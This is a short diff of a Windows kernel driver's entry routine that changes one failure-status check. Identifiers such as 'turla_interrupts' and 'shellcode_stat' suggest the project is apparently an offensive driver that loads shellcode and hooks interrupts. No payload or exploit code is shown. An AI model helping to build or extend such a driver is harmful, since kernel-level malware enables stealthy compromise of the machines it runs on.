@@ -21,6 +21,6 @@ auto driver_entry( PDRIVER_OBJECT drv, PUNICODE_STRING rp ) -> long
         return !turla_interrupts->initialize() ? status_failure : status_success;
     }();
 
-    if(!ioctl_stat || shellcode_stat == status_memory_alloc_failure || interrupt_stat == status_failure)
+    if(ioctl_stat == STATUS_FAILED_DRIVER_ENTRY || shellcode_stat == status_memory_alloc_failure || interrupt_stat == status_failure)
 	    return STATUS_FAILED_DRIVER_ENTRY;
 }
